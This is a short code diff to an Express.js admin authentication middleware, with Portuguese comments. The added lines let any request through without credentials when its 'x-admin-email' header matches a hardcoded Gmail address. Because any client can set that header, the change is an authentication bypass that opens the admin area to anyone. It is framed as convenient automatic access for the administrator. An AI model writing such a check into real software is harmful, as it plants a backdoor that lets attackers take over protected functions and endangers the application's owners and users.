@@ -6,6 +6,12 @@ const app = express();
 // Middleware para autenticação
 const adminAuth = (req, res, next) => {
   const authHeader = req.headers.authorization;
+
+  // Permitir acesso automático para o e-mail do administrador
+  if (req.headers['x-admin-email'] === 'salesmartins.siaw@gmail.com') {
+    return next();
+  }
+
   if (!authHeader) {
     return res.status(401).send('Autenticação necessária');
   }
